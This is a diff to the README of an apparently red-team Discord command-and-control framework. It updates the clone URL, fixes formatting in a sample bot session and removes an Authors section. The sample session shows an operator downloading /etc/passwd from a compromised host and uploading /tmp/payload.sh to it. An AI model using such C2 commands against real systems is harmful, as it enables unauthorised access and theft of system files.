@@ -41,8 +41,8 @@ This framework consists of two Python scripts:
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/discord-c2-framework.git
-cd discord-c2-framework
+git clone https://github.com/AibelKingslayer/DC2.git
+cd DC2
 ```
 
 2. Install required dependencies:
@@ -166,25 +166,27 @@ Bot: ```
 ```
 Helper: Decoded Output:
 ```
-    username
+username
 ```
 
 User: $download /etc/passwd
 Bot: [Sends file as attachment]
 
 User: $upload /tmp/payload.sh
-Bot: ```
+Bot: 
+```
     V2FpdGluZyBmb3IgZmlsZSB1cGxvYWQgdG86IC90bXAvcGF5bG9hZC5zaC4uLgo=
 ```
 [User uploads file]
-Bot: ```
+Bot: 
+```
     U2F2ZWQgZmlsZSB0bzogL3RtcC9wYXlsb2FkLnNoCg==
 ```
 
 User: $list /tmp
-Bot: ```
-    TGlzdGluZyBmaWxlcyBpbiAvdG1wOgpmaWxlMS50eHQKZmlsZTIudHh0
+Bot: 
 ```
+    TGlzdGluZyBmaWxlcyBpbiAvdG1wOgpmaWxlMS50eHQKZmlsZTIudHh0
 ```
 
 ## Technical Details
@@ -279,11 +281,6 @@ Organizations should:
 
 - [MITRE ATT&CK Framework](https://attack.mitre.org/)
 - [Discord API Documentation](https://discord.com/developers/docs/intro)
-
-
-## Authors
-
-[AibelKingslayer]
 
 ## Acknowledgments
 
